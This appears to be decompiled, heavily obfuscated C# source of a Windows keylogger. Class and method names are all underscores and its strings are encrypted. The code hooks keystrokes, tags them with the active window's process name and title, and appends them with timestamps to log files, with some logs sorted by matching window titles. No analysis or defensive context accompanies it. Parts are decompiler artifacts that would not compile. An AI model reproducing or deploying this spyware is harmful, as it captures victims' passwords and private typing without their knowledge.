using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
public sealed class _______________________________________
{
	public static string _;

	public static Keys __;

	private static ________________________________________ ___;

	private static string ____;

	static _______________________________________()
	{
		// Note: this type is marked as 'beforefieldinit'.
		int ___________;
		int arg_5D_0;
		if (((6720 ^ ___________ * 7 + ___________ + ___________ ^ (-5647 | ___________)) & 4) == 0)
		{
			___________ = <Module>.____________;
			if (___________ + 8782 - 8617 == ___________)
			{
				arg_5D_0 = -2038406570;
				goto IL_45;
			}
		}
		arg_5D_0 = System.Type.EmptyTypes.Length + 18043;
		IL_45:
		_______________________________________._ = <Module>.__________(arg_5D_0, System.Type.EmptyTypes.Length + 19386, sizeof(ulong) + 204);
		_______________________________________.___ = new ________________________________________();
	}

	[System.Runtime.InteropServices.DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern System.IntPtr GetForegroundWindow();

	[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowThreadProcessId(System.IntPtr intptr_0, ref int int_0);

	public static void ___()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			int num2;
			System.Threading.Thread thread;
			while (true)
			{
				ProjectData.ClearProjectError();
				num = 1;
				IL_03:
				num2 = 2;
				_______________________________________.___ = new ________________________________________();
				switch (sizeof(System.Guid) + -16)
				{
				case 0:
					IL_22:
					num2 = 3;
					_______________________________________.___.______________();
					IL_2F:
					num2 = 4;
					thread = new System.Threading.Thread(new System.Threading.ThreadStart(_______________________________________.____));
					if (System.Type.EmptyTypes.Length + -16985 != -18366)
					{
						goto Block_2;
					}
					continue;
				}
				goto IL_22;
			}
			Block_2:
			IL_63:
			num2 = 5;
			thread.SetApartmentState(System.Threading.ApartmentState.STA);
			IL_6D:
			num2 = 6;
			if (System.Type.EmptyTypes.Length + 7346 != 7346)
			{
			}
			thread.IsBackground = true;
			IL_8A:
			num2 = 7;
			thread.Start();
			IL_93:
			num2 = 8;
			_______________________________________.___._ += new ________________________________________.___________________________________________(_______________________________________.______);
			IL_AC:
			goto IL_122;
			IL_AE:
			int arg_B3_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_B3_0);
			IL_E0:
			goto IL_117;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_F4:
			goto IL_117;
		}
		object arg_F6_0;
		endfilter(arg_F6_0 is System.Exception & num != 0 & num3 == 0);
		IL_117:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_122:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void ____()
	{
		int num;
		int num4;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			int num2;
			while (true)
			{
				IL_08:
				num2 = 3;
				if (Operators.CompareString(_______________________________________._, string.Empty, false) != 0)
				{
					int ______________ = <Module>._______________;
					if (-______________ - 4835 != (int)((uint)(-(uint)(______________ * 134217728)) >> 27))
					{
					}
					string text;
					while (true)
					{
						IL_124:
						num2 = 4;
						text = _______________________________________.____ + <Module>.______<string>(1264287121u);
						int arg_73_0 = System.Type.EmptyTypes.Length + 0;
						while (true)
						{
							switch (arg_73_0)
							{
							case 1:
								goto IL_86;
							case 2:
								goto IL_196;
							}
							IL_4D:
							num2 = 5;
							string left = _______________________________________._______();
							IL_56:
							num2 = 6;
							if (Operators.CompareString(left, string.Empty, false) == 0)
							{
								goto IL_1C1;
							}
							arg_73_0 = System.Type.EmptyTypes.Length + 1;
						}
						IL_86:
						num2 = 7;
						if (_______________________________________._.Length <= 3)
						{
							break;
						}
						IL_99:
						num2 = 8;
						System.IO.File.AppendAllText(______________________.___ + System.DateTime.Now.ToString(<Module>.___<string>(463466858u)) + <Module>.______<string>(1957097582u), text + _______________________________________._ + <Module>._______<string>(4016157841u));
						IL_EF:
						int num3 = -17192;
						num2 = 9;
						if (!Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(_______________________________________._____(text), <Module>._______<string>(1950833015u), false))))
						{
							goto IL_196;
						}
						if (num3 == -17192)
						{
							goto IL_14A;
						}
					}
					IL_190:
					num2 = 14;
					goto IL_1C1;
					IL_196:
					num2 = 12;
					_______________________________________._ = <Module>.__________(2577, sizeof(ulong) + 4127, System.Type.EmptyTypes.Length + 245);
					goto IL_1C1;
					IL_14A:
					num2 = 10;
					System.IO.File.AppendAllText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(______________________._____, _______________________________________._____(text)), <Module>.______<string>(113553788u))), text + _______________________________________._ + <Module>.____<string>(2195909937u));
					goto IL_196;
				}
				IL_1C1:
				num2 = 18;
				System.Threading.Thread.Sleep(100);
			}
			IL_1D1:
			goto IL_276;
			IL_1D6:
			int arg_1DB_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_1DB_0);
			IL_234:
			goto IL_26B;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_248:
			goto IL_26B;
		}
		object arg_24A_0;
		endfilter(arg_24A_0 is System.Exception & num != 0 & num4 == 0);
		IL_26B:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_276:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static object _____(string string_0)
	{
		object result;
		try
		{
			string text = __________________________________________________________________.____(<Module>.___<string>(1408750413u));
			if (Operators.CompareString(text, <Module>.__________(sizeof(byte) + 7661, System.Type.EmptyTypes.Length + 9265, sizeof(double) + 187), false) != 0)
			{
				string text2 = string_0.ToLower();
				int num = System.Type.EmptyTypes.Length + 21181;
				int arg_1C5_0;
				if ((8388608u & (uint)num >> 9) != (uint)(num - (num - 3954) << 23 & 8388608))
				{
					int ___________ = <Module>.____________;
					int num2;
					if (___________ / 362426 - -1073741824 != -(num2 / 3185410) / 64)
					{
						int ____________;
						arg_1C5_0 = ((-(____________ << 24) != 1741) ? (System.Type.EmptyTypes.Length + -2113698188) : (sizeof(ulong) + 1873032475));
					}
					else
					{
						int arg_E3_0 = 2048;
						int ____________ = <Module>._____________;
						arg_1C5_0 = ((((arg_E3_0 * ____________ ^ (int)((uint)(____________ % 4096) >> 19)) & 256) == 0) ? 802822928 : ((____________ + 7121 == (____________ << 4) - ____________ % 524288) ? (System.Type.EmptyTypes.Length + 1205862654) : (sizeof(ushort) + -1451822392)));
					}
				}
				else
				{
					arg_1C5_0 = System.Type.EmptyTypes.Length + 2;
				}
				string[] array;
				while (true)
				{
					string expression;
					int num3;
					string[] array3;
					switch (arg_1C5_0)
					{
					case 1:
						do
						{
							array = Strings.Split(expression, <Module>._______<string>(1023697363u), -1, CompareMethod.Binary);
						}
						while (num != 26639);
						if (array.Length != 3 || !text2.Contains(array[0]))
						{
							num3++;
							goto IL_167;
						}
						goto IL_1E4;
					case 2:
					{
						string[] array2 = Strings.Split(text, <Module>.______<string>(1289956344u), -1, CompareMethod.Binary);
						if (num != 28659)
						{
						}
						array3 = array2;
						num3 = 0;
						goto IL_167;
					}
					}
					goto IL_1D6;
					IL_167:
					if (num3 >= array3.Length)
					{
						goto IL_1EC;
					}
					expression = array3[num3];
					num = System.Type.EmptyTypes.Length + 26639;
					arg_1C5_0 = System.Type.EmptyTypes.Length + 1;
				}
				IL_1E4:
				result = array[1];
				return result;
				IL_1EC:
				result = <Module>._______<string>(1950833015u);
				return result;
			}
			IL_1D6:
			result = <Module>._____<string>(2303988711u);
		}
		catch (System.Exception arg_1FA_0)
		{
			ProjectData.SetProjectError(arg_1FA_0);
			result = <Module>._______<string>(1950833015u);
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ______(Keys keys_0)
	{
		int num;
		int num4;
		try
		{
			IL_00:
			int arg_1A_0 = 16777216;
			int arg_11_0 = 167772160;
			int ____________ = <Module>._____________;
			int num2;
			if ((arg_1A_0 & (arg_11_0 * ____________ ^ ____________ / 183963)) == 0)
			{
				ProjectData.ClearProjectError();
				num = 1;
				IL_2B:
				num2 = 2;
				if (keys_0 != Keys.None)
				{
					int num3 = (-2147483648 + num4 * 1073741824 != 1073741824 * (num4 - -1052231380)) ? (sizeof(ulong) + -3672) : (System.Type.EmptyTypes.Length + 681263099);
					switch (((num4 | 1634) - 1891 != num4 - 4420) ? ((((7850 ^ ____________) & 256) != (____________ & 256)) ? (sizeof(int) + -2032417878) : 0) : (System.Type.EmptyTypes.Length + 2095995338))
					{
					case 0:
						IL_C3:
						num3 = -3664;
						break;
					}
					do
					{
						num2 = 3;
						if (Operators.CompareString(_______________________________________.___.________________(keys_0), <Module>.____<string>(1125972394u), false) != 0)
						{
							goto IL_203;
						}
						if (num3 != -3664)
						{
							break;
						}
						IL_DB:
						num2 = 4;
						if (Operators.CompareString(_______________________________________._, <Module>.__________((num4 * 3 + num4 == 2961) ? (((2048 & num2 * 1534853120 + 9989) == (num2 * 19514 << 11 & 2048)) ? ((num2 / 64312807 - 6641 != 4976) ? (sizeof(ushort) + 1224168802) : (System.Type.EmptyTypes.Length + 409549022)) : (System.Type.EmptyTypes.Length + 2034685452)) : (System.Type.EmptyTypes.Length + 39566), sizeof(double) + 40814, ((-3 | 3 * num + num - 2636) == -3) ? 26 : (sizeof(uint) + 770530409)), false) == 0)
						{
							goto IL_22E;
						}
						num3 = 15942;
					}
					while (System.Type.EmptyTypes.Length + 3718 == 23703);
					goto IL_1E3;
					IL_203:
					num2 = 8;
					IL_206:
					num2 = 9;
					_______________________________________._ += _______________________________________.___.________________(keys_0);
					IL_224:
					num2 = 10;
					_______________________________________.__ = keys_0;
					goto IL_22E;
				}
				goto IL_22E;
			}
			IL_1E3:
			num2 = 5;
			_______________________________________._ = _______________________________________._.Remove(_______________________________________._.Length - 1);
			IL_22E:
			goto IL_2B7;
			IL_233:
			int arg_238_0 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_238_0);
			IL_275:
			goto IL_2AC;
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_289:
			goto IL_2AC;
		}
		object arg_28B_0;
		endfilter(arg_28B_0 is System.Exception & num != 0 & num4 == 0);
		IL_2AC:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_2B7:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static string _______()
	{
		string result;
		try
		{
			System.IntPtr foregroundWindow = _______________________________________.GetForegroundWindow();
			int num;
			_______________________________________.GetWindowThreadProcessId(foregroundWindow, ref num);
			Process processById = Process.GetProcessById(num);
			string text = <Module>.____<string>(3888109736u) + processById.ProcessName + <Module>.___<string>(3608930325u) + processById.MainWindowTitle;
			switch (System.Type.EmptyTypes.Length + 0)
			{
			case 0:
				IL_50:
				if (Operators.CompareString(_______________________________________.____, text, false) == 0)
				{
					result = <Module>.__________(((-2147477529 ^ num % 1176201765) == 0) ? -711530863 : (sizeof(byte) + 10191), sizeof(ushort) + 10871, ((268435455 | num / 17) != 268435455) ? (sizeof(int) + 2114525397) : 219);
					return result;
				}
				_______________________________________.____ = text;
				result = text;
				return result;
			}
			goto IL_50;
		}
		catch (System.Exception expr_C7)
		{
			ProjectData.SetProjectError(expr_C7);
			int ___________ = <Module>.____________;
			int num;
			result = <Module>.__________((~(___________ / 160454002) != 67108864 * (num * 9 + 23 * num)) ? (sizeof(System.Guid) + 18415) : -1361878613, (___________ / 70500 != 1769644751) ? 19141 : (System.Type.EmptyTypes.Length + -1767904212), 22);
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
